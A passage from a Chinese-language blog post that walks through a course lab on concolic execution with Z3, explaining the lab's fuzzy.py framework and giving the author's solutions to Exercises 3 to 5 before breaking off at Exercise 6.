class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># concrete_values.</span><br>  concrete_values.mk_global()<br>  v = testfunc()<br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Test generated&#x27;</span>, <span class="hljs-built_in">len</span>(cur_path_constr), <span class="hljs-string">&#x27;branches:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> (c, caller) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cur_path_constr, cur_path_constr_callers):<br>      <span class="hljs-built_in">print</span>(indent(z3expr(c)), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;%s:%d&#x27;</span> % (caller[<span class="hljs-number">0</span>], caller[<span class="hljs-number">1</span>]))<br><br>  <span class="hljs-keyword">return</span> (v, cur_path_constr, cur_path_constr_callers)<br></code></pre></td></tr></table></figure><p>可以看到在该函数中并没有更改路径约束与信息的列表，实际上这在 <code>add_constr()</code> 中完成，该函数在 <code>concolic_bool()</code> 中调用，将约束信息进行添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constr</span>(<span class="hljs-params">e</span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr.append(simplify(e))<br>  cur_path_constr_callers.append(get_caller())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_bool</span>(<span class="hljs-params">sym, v</span>):<br>  <span class="hljs-comment">## Python claims that &#x27;bool&#x27; is not an acceptable base type,</span><br>  <span class="hljs-comment">## so it seems difficult to subclass bool.  Luckily, bool has</span><br>  <span class="hljs-comment">## only two possible values, so whenever we get a concolic</span><br>  <span class="hljs-comment">## bool, add its value to the constraint.</span><br>  add_constr(sym_eq(sym, ast(v)))<br>  <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>而 <code>concolic_bool()</code> 实际上在 <code>concolic_int</code> 与 <code>concolic_str</code> 的运算符重载中进行调用，这也是为什么每次执行 <code>concolic_exec_input()</code> 都要<strong>重新将路径约束与信息列表清空</strong>的缘故，这里以 <code>concolic_int </code>中的 <code>__cmp__</code> 运算符为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__cmp__</span>(<span class="hljs-params">self, o</span>):<br>  res = <span class="hljs-built_in">int</span>(self.__v).__cmp__(<span class="hljs-built_in">int</span>(o))<br>  <span class="hljs-keyword">if</span> concolic_bool(sym_lt(ast(self), ast(o)), res &lt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> concolic_bool(sym_gt(ast(self), ast(o)), res &gt; <span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><hr><p>我们接下来来看  <code>symex_exercises.py</code>  里有啥，主要就一个 <code>make_a_test()</code> 函数，我们需要在其中完成全局具体值字典 <code>concrete_values</code> 的构建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>那么我们该如何修改   <code>symex_exercises.py</code> 中创建的字典呢？我们先看一下 Exercise 3 的评判标准，在 <code>check_lab3.py</code> 中检测的是运行 <code>check-symex-int.py</code> 后要输出 <code>&quot;Found input for 1234&quot;</code> 字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_symex_int</span>():<br>    sh(<span class="hljs-string">&#x27;python3 check-symex-int.py &gt;/tmp/lab3.log&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Found input for 1234&#x27;</span> <span class="hljs-keyword">in</span> file_read(<span class="hljs-string">&#x27;/tmp/lab3.log&#x27;</span>):<br>        log(green(<span class="hljs-string">&quot;PASS&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log(red(<span class="hljs-string">&quot;FAIL&quot;</span>), <span class="hljs-string">&quot;Exercise 3: concrete input for 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们接下来来看  <code>check-symex-int.py</code> ，其开头的逻辑如下，<code>r</code> 的值为 1234 即可通过 Exercise 3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure><p>如前面我们对 <code>concolic_exec_input()</code> 的分析，<code>r</code> 的值由传入的函数指针决定，故我们来看 <code>test_f()</code> 的逻辑，主要就是用 <code>mk_int()</code> 从全局具体值字典中获取 id 为 <code>i</code> 的值传入 <code>f()</code> 中进行运算，若不存在 <code>i</code> 则 <code>i</code> 会被默认赋值 <code>0</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>由函数 <code>f()</code> 我们可以知道的是我们只需要向具体值字典中添加一个 <code>i = 123 * 7</code> 的值即可让 <code>test_f()</code> 返回 <code>1234</code>，故修改 <code>symex_exercises.py</code> 如下，这里用 <code>mk_int()</code> 和 <code>add()</code> 都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 3：</p><p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" alt="image.png"></p><p>接下来是 Exercise 4，完成 <code>symex/fuzzy.py</code> 中 <code>concolic_find_input</code>  的实现：</p><blockquote><p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>在该函数当中我们需要完成对约束的求解并返回对应的结果，因此这里需要使用 Z3 求解器来完成约束求解过程，不过这里已经将调用 Z3 的流程在 <code>fork_and_check()</code> 中完成封装，我们只需要调用该函数进行求解即可，那么我们先来看  <code>fork_and_check()</code> 的具体实现：</p><ul><li>创建子进程调用 <code>fork_and_check_worker()</code> 进行约束求解，父子进程通过管道通信</li><li>父进程等待子进程的 <code>SIGALRM</code> 信号，若 <code>z3_timeout</code> 秒后未收到，杀死子进程</li><li>从管道接收结果并返回，若超时（子进程被杀，管道关闭）则返回 <code>(z3.unknown, None)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>接下来我们来看   <code>fork_and_check_workder()</code> 的具体实现：</p><ul><li>新建一个 Z3 求解器将转化为字符串的约束表达式传入，调用 <code>Solver.check()</code> 求解</li><li>若求解成功，调用 <code>Solver.model()</code> 获得求解结果</li><li>判断结果中变量类型并转换为整型&#x2F;字符串，对于字符串做额外处理，将结果放到一个 <code>字符串→结果</code> 映射的字典中并返回</li></ul><blockquote><p>Z3 这玩意用起来确实方便，不愧是微软<del>大爹</del></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure><p>那么现在我们可以完成 Exercise 4 了，我们只需要调用  <code>fork_and_check()</code> 进行求解即可，需要注意的是我们返回的字典中的键值对应当只包含 <code>ok_names</code> 参数中所需要的键，若 <code>ok_names == None</code> 则将所有的键值对添加到字典中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 4：</p><p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" alt="image.png"></p><p>然后是 Exercise 5， 完成 <code>symex/fuzzy.py</code> 中 <code>concolic_force_branch</code>  的实现：</p><blockquote><p>提前说一下，这个 Exercise 5 的检查<strong>非常松</strong>，不要以为通过检查就是真的 Pass 了，最好自己再看看代码逻辑是否符合要求…</p></blockquote><blockquote><p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>正如前文所说，在遇到分支时我们需要<strong>逆转当前分支条件，以探索另一分支</strong>，该函数的作用实际上就是逆转 <code>branch_conds</code> 中的第 <code>b</code> 分支的条件，并返回新的约束条件集合，那么我们只需要取出该条件并使用 <code>sym_not()</code> 取反后再用 <code>sym_and()</code> 加上该分支之前所有的条件约束即可</p><p>注意这里的参数 <code>b</code> 为分支标号，<code>branch_conds</code> 与 <code>branch_callers</code> 为分支的条件与调用者数组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 5：</p><p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" alt="image.png"></p><p>最后是 Exercise 6， <strong>使用我们在 Exercise 3-5 中涉及的几个函数来完成 <code>concolic_execs()</code>—— 完整的混合执行函数的构建</strong>，我们需要完成对 <code>func</code> 中的<strong>每一条分支</strong>的执行：</p><blockquote><p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p><p>Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p><p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p></blockquote><p>我们先看 <code>concolic_execs()</code> 中已有的逻辑框架：</p><ul><li><code>checked</code> 为已经检查过的约束，<code>outs</code> 为最后求解所得结果，<code>inputs</code> 为待测试输入队列（输入为具体值字典）</li><li>由一个大循环持续调用<code>concolic_exec_input()</code> 计算约束</li><li>将新的约束解添加到结果中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure><p>我们的代码需要添加在大循环的后半部分，那么我们先回顾一下在 Exercise 3-5 中我们都获得了哪些可用函数：</p><ul><li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>：将 <code>concrete_values</code> 参数设为全局字典，之后执行给定的函数 <code>testfunc</code>，返回执行的结果值、分支条件列表、分支调用信息列表</li><li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>：使用 Z3 求解给定约束，返回 <code>ok_names</code> 列表中变量的值</li><li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>：对给定约束条件 <code>branch_conds</code> 与分支 <code>b</code>，返回走向该分支另一路径的约束</li></ul><p>接下来我们看 Lab 给的提示信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure><ul><li>迭代 <code>concolic_exec_input()</code> 所返回的分支集合</li><li>使用 <code>concolic_force_branch()</code> 来构建一个分支的另一路径约束</li><li>若约束已经在 <code>check</code> 集合中，将其跳过，否则加入集合中</li><li>使用 <code>concolic_find_input()</code> 以构建一个基于另一路径约束的新的测试输入</li><li>Z3 可能不会为每个变量分配值（例如变量可能与约束无关），我们需要从上次使用的字典继承到 <code>concolic_find_input()</code> 返回的新字典中，将新的字典添加到 <code>input</code> 队列中</li></ul><p>依照以上思路，笔者最后在大循环末尾补全代码如下：</p><figure class="highlight python"><table><tr><td 